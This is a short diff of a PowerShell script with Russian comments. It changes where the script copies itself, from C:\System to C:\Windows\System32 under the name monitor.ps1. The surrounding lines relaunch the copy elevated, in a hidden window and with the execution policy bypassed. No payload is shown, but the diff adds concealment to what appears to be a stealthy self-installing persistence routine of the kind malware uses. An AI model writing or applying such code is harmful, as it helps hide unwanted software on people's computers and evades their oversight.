@@ -1,9 +1,9 @@
 # === ПОЛНЫЙ ПУТЬ К СКРИПТУ ===
-$taskScriptPath = "C:\System\monitor.ps1"
+$taskScriptPath = "C:\Windows\System32\monitor.ps1"
 
 # === ЕСЛИ СКРИПТ ЗАПУЩЕН НЕ ИЗ C:\System, КОПИРУЕМ СЕБЯ ===
 if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
-    New-Item -ItemType Directory -Path "C:\System" -Force | Out-Null
+    New-Item -ItemType Directory -Path "C:\Windows\System32" -Force | Out-Null
     Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScriptPath -Force
     Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`"" -Verb RunAs
     exit
